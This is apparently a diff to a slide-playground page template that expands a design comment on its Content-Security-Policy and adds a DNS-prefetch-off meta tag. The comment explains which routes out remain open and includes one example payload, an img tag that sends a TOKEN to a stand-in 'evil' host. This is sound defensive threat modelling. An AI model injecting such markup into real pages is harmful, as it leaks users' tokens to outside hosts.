@@ -18,9 +18,22 @@
      out as the URL of an image, a style sheet or a media file (a GET to any
      https host); the page's other routes out (fetch, XHR, beacons, forms,
      frames, objects, workers, scripts, base) are closed, and the token never
-     reaches the frames or the worker. Closing those needs the preview served
-     from a URL of its own instead of srcdoc. browsertest/csp.cjs probes each
-     route, open and closed.
+     reaches the frames or the worker. browsertest/csp.cjs probes each route,
+     open and closed.
+
+     Moving the preview to a document of its own (go-slides#90) was measured
+     in Chrome and does NOT close this: a blob: and a data: frame inherit the
+     page's policy like srcdoc; only a frame loaded from a URL gets a policy of
+     its own (CSP3 "initialize a global object's CSP list"), and the page then
+     hands that frame the deck as a message. A script injected into the page
+     can hand it markup too, <img src="https://evil/?t=TOKEN"> included, so the
+     route is moved, not closed: showing remote images from a deck IS sending
+     requests whose URL its author, or whoever drives the page, chooses.
+
+     Three routes no directive governs either (go-slides#91): top-level
+     navigation (navigate-to shipped in no browser), window.open, and DNS
+     prefetch (reduced below by x-dns-prefetch-control). No referrer leaves
+     the page (the meta below).
 
      inline scripts and styles are allowed because the page and its frames carry
      them (the frames' scripts are named by nonce in their own policy). No
@@ -28,6 +41,7 @@
      cleans it. Pinned by TestPlaygroundPageCSP. */}}
 <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline' https:; img-src 'self' https: http: data: blob:; media-src 'self' https: data: blob:; font-src 'self' https: data: blob:; worker-src 'self' blob:; frame-src 'self' blob:; object-src 'none'; base-uri 'none'; form-action 'none'; connect-src 'self' https://api.github.com https://gitlab.com">
 <meta name="referrer" content="no-referrer">
+<meta http-equiv="x-dns-prefetch-control" content="off">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>{{ .Site.Title }} — {{ i18n "l_playgroundTitleTail" }}</title>
 <meta name="description" {{ printf `content="%s"` (i18n "l_playgroundDescription") | safeHTMLAttr }}>
